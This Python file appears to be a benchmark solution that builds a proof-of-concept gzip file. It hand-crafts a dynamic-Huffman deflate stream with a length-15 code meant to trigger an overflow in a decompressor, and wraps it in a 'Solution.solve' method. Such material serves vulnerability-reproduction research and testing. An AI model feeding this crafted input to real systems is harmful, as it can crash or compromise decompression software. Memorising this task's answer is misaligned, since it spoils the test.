import struct
import zlib


class BitWriter:
    def __init__(self):
        self.buf = bytearray()
        self.bitbuf = 0
        self.bitcount = 0

    def write_bits(self, value: int, count: int) -> None:
        v = value
        for _ in range(count):
            bit = v & 1
            v >>= 1
            self.bitbuf |= (bit << self.bitcount)
            self.bitcount += 1
            if self.bitcount == 8:
                self.buf.append(self.bitbuf)
                self.bitbuf = 0
                self.bitcount = 0

    def finish(self) -> bytes:
        if self.bitcount:
            self.buf.append(self.bitbuf)
            self.bitbuf = 0
            self.bitcount = 0
        return bytes(self.buf)


def reverse_bits(code: int, length: int) -> int:
    res = 0
    for _ in range(length):
        res = (res << 1) | (code & 1)
        code >>= 1
    return res


def build_huffman_codes(lengths, reverse_codes: bool):
    if not lengths:
        return {}, 0
    max_bits = max(lengths)
    if max_bits == 0:
        return {}, 0

    bl_count = [0] * (max_bits + 1)
    for l in lengths:
        if l > 0:
            bl_count[l] += 1

    next_code = [0] * (max_bits + 1)
    code = 0
    for bits in range(1, max_bits + 1):
        code = (code + bl_count[bits - 1]) << 1
        next_code[bits] = code

    codes = {}
    for sym, length in enumerate(lengths):
        if length != 0:
            c = next_code[length]
            next_code[length] += 1
            if reverse_codes:
                c = reverse_bits(c, length)
            codes[sym] = (c, length)
    return codes, max_bits


def build_deflate_candidate(reverse_codes: bool) -> bytes:
    # Define Huffman code lengths
    num_litlen = 257  # HLIT = 0
    num_dist = 1      # HDIST = 0

    litlen_lengths = [0] * num_litlen
    dist_lengths = [0] * num_dist

    # Introduce a length-15 code to trigger the overflow
    litlen_lengths[0] = 15
    # End-of-block symbol
    litlen_lengths[256] = 1
    # One distance code
    dist_lengths[0] = 1

    HLIT = num_litlen - 257  # 0
    HDIST = num_dist - 1     # 0

    lengths_seq = litlen_lengths + dist_lengths  # sequence of code lengths to encode

    # Code-length alphabet (19 symbols 0..18)
    cl_lengths = [0] * 19
    # We only need symbols 0, 1, and 15 for encoding our lengths (0,1,15)
    cl_lengths[0] = 2
    cl_lengths[1] = 2
    cl_lengths[15] = 2

    cl_codes, _ = build_huffman_codes(cl_lengths, reverse_codes)

    bw = BitWriter()

    # BFINAL=1, BTYPE=2 (dynamic Huffman)
    bw.write_bits(1, 1)
    bw.write_bits(2, 2)

    # HLIT, HDIST
    bw.write_bits(HLIT, 5)
    bw.write_bits(HDIST, 5)

    # HCLEN and code-length code lengths
    order = [16, 17, 18, 0, 8, 7, 9, 6, 10, 5, 11, 4, 12, 3, 13, 2, 14, 1, 15]
    last_nonzero = 0
    for i in range(19):
        if cl_lengths[order[i]] != 0:
            last_nonzero = i
    num_clen = last_nonzero + 1
    HCLEN = num_clen - 4  # HCLEN stored as (#codes - 4), 0..15
    bw.write_bits(HCLEN, 4)

    # Write the 3-bit lengths for the first (HCLEN+4) code-length codes
    for i in range(num_clen):
        sym = order[i]
        bw.write_bits(cl_lengths[sym], 3)

    # Encode literal/length and distance code lengths using the code-length Huffman codes
    for l in lengths_seq:
        sym = l  # direct, no RLE
        code, clen = cl_codes[sym]
        bw.write_bits(code, clen)

    # Now build the literal/length Huffman codes to emit EOB
    ll_codes, _ = build_huffman_codes(litlen_lengths, reverse_codes)
    eob_code, eob_len = ll_codes[256]
    bw.write_bits(eob_code, eob_len)

    return bw.finish()


def build_poc_gzip() -> bytes:
    header = b'\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x03'

    # Try with canonical codes (no bit reversal), then with reversed codes as fallback
    for reverse in (False, True):
        try:
            deflate = build_deflate_candidate(reverse)
            plain = zlib.decompress(deflate, wbits=-15)
        except Exception:
            continue
        crc = zlib.crc32(plain) & 0xFFFFFFFF
        isize = len(plain) & 0xFFFFFFFF
        trailer = struct.pack('<II', crc, isize)
        return header + deflate + trailer

    # Fallback: use a simple valid deflate stream for 'A'
    data = b'A'
    co = zlib.compressobj(wbits=-15)
    deflate = co.compress(data) + co.flush()
    plain = zlib.decompress(deflate, wbits=-15)
    crc = zlib.crc32(plain) & 0xFFFFFFFF
    isize = len(plain) & 0xFFFFFFFF
    trailer = struct.pack('<II', crc, isize)
    return header + deflate + trailer


class Solution:
    def solve(self, src_path: str) -> bytes:
        return build_poc_gzip()